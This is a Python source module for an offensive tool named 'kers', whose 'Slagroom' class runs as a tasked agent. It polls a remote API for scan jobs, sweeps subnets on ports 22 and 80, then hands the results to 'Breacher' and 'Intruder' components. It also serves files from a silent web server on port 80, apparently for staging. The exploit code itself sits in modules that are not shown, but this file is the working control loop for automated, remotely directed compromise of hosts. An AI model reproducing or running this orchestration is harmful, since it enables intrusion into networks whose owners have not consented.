"""
This module implements the main functionality of kers.

Authors:
- Marijn van Dijk
- Tom Buis
"""

import os
import codecs
import json
import sys
import threading
import queue
import time
import uuid
import datetime
import asyncio
import http.server
import socketserver
from pathlib import Path

from libkers.apiClient import ApiClient
from libkers.scanner import Scanner
from libkers.breacher import Breacher
from libkers.intruder import Intruder
from libkers.ipParse import ip_parse


class Handler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory="www", **kwargs)

    def list_directory(self, path):
        # Return a 403 Forbidden response instead of listing directory contents
        self.send_error(403, "Directory listing is not allowed")
        return None

    def log_message(self, format, *args):
        # Override log_message to disable logging
        return


def _start_webserver() -> None:
    with socketserver.TCPServer(("0.0.0.0", 80), Handler) as httpd:
        print("[Slagroom] Webserver listening on port 80")
        httpd.serve_forever()


class Slagroom:
    """
    Class for kers.
    This class is used to handle all the reconnaissance and attack surface mapping activity.

    ### Attributes

    private:


    ### Methods

    private:


    public:

    """

    def __init__(self,
                 config_file='config.json',
                 directory='cache'):
        """
        Creates a new instance of Slagroom.

        ### Parameters

        config_file : str
            The path to the configuration file.
        directory : str
            The directory where the cache and log files are stored.
        """

        self._config_file = config_file
        self._directory = directory
        self._load_config()
        self._verify_config()

        self._wait_time = 10
        if self._config["KEEP_GOING"] == 0:
            self._die = 1
        else:
            self._die = 0
        self._apiClient = ApiClient(self._config["API_URL"], self._config["JWT_TOKEN"])
        Path("www").mkdir(parents=True, exist_ok=True)
        self._scanner = Scanner()
        self._breacher = Breacher()
        self._intruder = Intruder(self._apiClient)
        self._task_queue = queue.Queue()
        self._task = None
        self._www_thread = threading.Thread(target=_start_webserver, daemon=True).start()
        self._thread = threading.Thread(target=self._worker, daemon=True)

    def _load_config(self) -> None:
        """
        Loads the configuration file.
        """
        if not os.path.isfile(self._config_file):
            raise FileNotFoundError(f"The configuration file ({self._config_file}) "
                                    f"could not be located at the specified path.")

        config = open(self._config_file, 'r').read()
        try:
            self._config = json.loads(config)
        except ValueError:
            raise ValueError(Exception(f"The configuration file ({self._config_file}) is not a valid JSON file."))

    def _verify_config(self) -> None:
        if 'API_URL' not in self._config.keys() or 'JWT_TOKEN' not in self._config.keys():
            raise ValueError(f"Config does not hold all expected keys: {['API_URL', 'JWT_TOKEN']}")
        elif 'KEEP_GOING' not in self._config:
            self._config['KEEP_GOING'] = 1

    def _fill_queue(self) -> None:
        tasks = self._apiClient.check_in()
        for task in tasks:
            self._task_queue.put(task)

    def _worker(self) -> None:
        while True:
            try:
                if self._task_queue.qsize() == 0:
                    print(f'[Slagroom] Filling queue')
                    self._fill_queue()
                    if self._task_queue.qsize() == 0:
                        print(f'[Slagroom] No tasks at : {datetime.datetime.now()}')
                        time.sleep(self._wait_time)
                        continue
                print("[Slagroom] Tasks in queue...!")
                task = self._task_queue.get()
                print(f"[Slagroom] Current task : {task}")
                if task['command'] == 'recruiter.scan':
                    ips = ip_parse(task['subnets'])
                    print(f"[Slagroom] Scanning {ips}")
                    scan_output = self._scanner.scan_range(ips, ["22", "80"])
                    print(f"[Slagroom] Breaching {scan_output}")
                    breach_output = self._breacher.breach(scan_output)
                    print(f"[Slagroom] Output: {breach_output}")
                    print(f"[Slagroom] Intruding {breach_output}")
                    intrude_output = self._intruder.intrude(breach_output)
                    print(f"[Slagroom] Output: {intrude_output}")
                self._task_queue.task_done()
                if self._die == 1:
                    sys.exit(0)
                else:
                    time.sleep(self._wait_time)
            except KeyboardInterrupt:
                sys.exit(0)

    def start(self) -> None:
        print("[Slagroom] Starting Slagroom...")
        self._thread.start()
        self._thread.join()
